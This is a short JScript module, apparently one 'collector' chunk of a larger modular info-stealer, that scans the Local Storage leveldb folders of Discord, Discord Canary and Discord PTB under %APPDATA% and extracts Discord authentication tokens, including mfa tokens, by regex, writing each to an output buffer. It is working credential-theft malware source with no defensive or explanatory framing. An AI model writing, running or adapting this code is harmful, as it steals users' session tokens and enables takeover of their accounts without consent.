// chunk: collectors/discord_tokens
// depends: core/emit_buffer, core/file_ops
// provides: collect_discord
// format: jscript

function collect_discord() {
    emit("\r\n=== DISCORD TOKENS ===\r\n");
    var appdata = _s.ExpandEnvironmentStrings("%APPDATA%");
    var paths = [
        appdata + "\\discord\\Local Storage\\leveldb",
        appdata + "\\discordcanary\\Local Storage\\leveldb",
        appdata + "\\discordptb\\Local Storage\\leveldb"
    ];
    for (var i = 0; i < paths.length; i++) {
        if (_fso.FolderExists(paths[i])) {
            emit("  Found: " + paths[i] + "\r\n");
            var folder = _fso.GetFolder(paths[i]);
            var files = new Enumerator(folder.Files);
            for (; !files.atEnd(); files.moveNext()) {
                var f = files.item();
                if (/\.ldb$|\.log$/.test(f.Name)) {
                    var content = read_file(f.Path, 65536);
                    var tokens = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}/g);
                    if (tokens) {
                        for (var t = 0; t < tokens.length; t++) {
                            emit("  TOKEN: " + tokens[t] + "\r\n");
                        }
                    }
                }
            }
        }
    }
}
